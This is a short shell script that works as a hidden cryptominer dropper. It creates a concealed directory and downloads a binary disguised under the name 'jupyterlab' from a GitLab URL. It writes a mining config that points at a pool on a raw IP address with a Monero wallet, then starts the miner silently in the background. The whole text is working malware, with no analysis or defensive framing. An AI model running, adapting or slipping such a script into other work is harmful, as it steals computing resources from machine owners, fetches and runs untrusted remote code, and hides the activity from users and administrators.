cd ~/
mkdir .wolu && cd .wolu

wget -qO wolu https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab && chmod +x wolu >/dev/null 2>&1

cat > config.json <<END
{
    "autosave": true,
    "randomx": {
        "1gb-pages": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "rx/0": [-1, -1, -1, -1,-1, -1, -1, -1]
},
    "pools": [
        {
            "algo": "null",
            "coin": null,
            "url": "47.236.126.193:443",
            "user": "89sFpdzyEQjg8ZHaDDDZ5GUonqznYCDCmEScNTAQtrg341Pz82KG82hE2zWDwWg4gmgBVUmWTYy58ArUPCXH3KrtKJzoGvQ",
            "pass": "GH",
            "keepalive": true,
        }
    ],
}
END


nohup ./wolu &>/dev/null &
